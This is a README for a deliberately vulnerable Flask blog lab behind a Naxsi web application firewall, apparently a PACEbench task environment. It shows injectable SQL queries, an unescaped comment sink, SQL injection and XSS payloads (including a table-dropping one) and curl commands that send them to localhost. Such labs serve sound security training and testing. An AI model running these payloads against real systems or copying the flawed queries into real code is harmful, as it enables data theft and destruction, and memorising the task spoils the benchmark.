# Naxsi WAF Lab

## Overview

This is a Naxsi WAF-based lab including a vulnerable blog app protected by Naxsi.

## Architecture

```
Attacker → Nginx(8080) + Naxsi WAF → VulApp(5001)
Attacker → VulApp(5001) [bypass WAF]
```

## Components

### 1. Vulnerable App (VulApp)
- **Port**: 5001 (direct)
- **Stack**: Flask + SQLite
- **Vulnerabilities**:
  - SQL Injection (login, search, comment)
  - XSS (comment content)
  - Unauthorized access (user info API)

### 2. Nginx + Naxsi WAF
- **Port**: 8080 (WAF)
- **Stack**: Nginx + Naxsi module
- **Rules**: based on naxsi_core.rules

## Vulnerability details

### SQL Injection

#### 1. Login
```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

**Payloads**:
```sql
' OR '1'='1
admin' --
' UNION SELECT 1,2,3,4,5 --
```

#### 2. Search
```python
sql_query = f"SELECT p.id, p.title, p.content, p.created_at, u.username FROM posts p JOIN users u ON p.author_id = u.id WHERE p.title LIKE '%{query}%' OR p.content LIKE '%{query}%'"
```

**Payloads**:
```sql
' UNION SELECT 1,flag,3,4,5 FROM flags --
' UNION SELECT 1,2,3,4,5 FROM users --
```

#### 3. Comment
```python
query = f"INSERT INTO comments (post_id, content, author, created_at) VALUES ({post_id}, '{content}', '{author}', datetime('now'))"
```

**Payloads**:
```sql
'); DROP TABLE comments; --
```

### XSS

#### Comment content
```python
# Rendered directly without HTML escaping
{{ comment.content | safe }}
```

**Payloads**:
```html
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
```

### Unauthorized access

#### User info API
```python
@app.route('/api/users')
def api_users():
    # No authorization checks
    c.execute("SELECT id, username, email, role FROM users")
```

## Naxsi WAF rules

### Core rules (naxsi_core.rules)
- SQLi: ID 1000-1099
- RFI: ID 1100-1199  
- Directory traversal: ID 1200-1299
- XSS: ID 1300-1399
- File upload: ID 1500-1600

### Thresholds
- SQLi: score 8
- RFI: score 8
- Directory traversal: score 4
- XSS: score 8
- File upload: score 8

## Testing

### 1. Bypass WAF (direct app)
```bash
# Access the vulnerable app
curl http://localhost:5001

# SQLi tests
curl -X POST http://localhost:5001/login -d "username=' OR '1'='1&password=1"
curl "http://localhost:5001/search?q=' UNION SELECT 1,flag,3,4,5 FROM flags --"

# XSS tests
curl -X POST http://localhost:5001/comment -d "post_id=1&content=<script>alert('XSS')</script>"
```

### 2. WAF protection (via Nginx)
```bash
# The same payloads should be blocked by WAF
curl -X POST http://localhost:8080/login -d "username=' OR '1'='1&password=1"
curl "http://localhost:8080/search?q=' UNION SELECT 1,flag,3,4,5 FROM flags --"
```

### 3. View WAF logs
```bash
docker-compose logs nginx-naxsi
docker-compose logs nginx-logs
```

## Dynamic flag

The flag is injected via `flag.sql` and supports PACEbench automation.

## Run

### Manual
```bash
cd docker/defense/naxsi_waf
docker-compose up -d
```

### PACEbench
```bash
python3 main.py env --task NAXSI-WAF
```

## Learning mode

To enable Naxsi learning mode, edit `nginx.conf` and `naxsi.rules`:

1. Uncomment learning configs in `nginx.conf`
2. Enable `LearningMode;` in `naxsi.rules`
3. Rebuild and restart

Learning mode auto-generates whitelists to reduce false positives.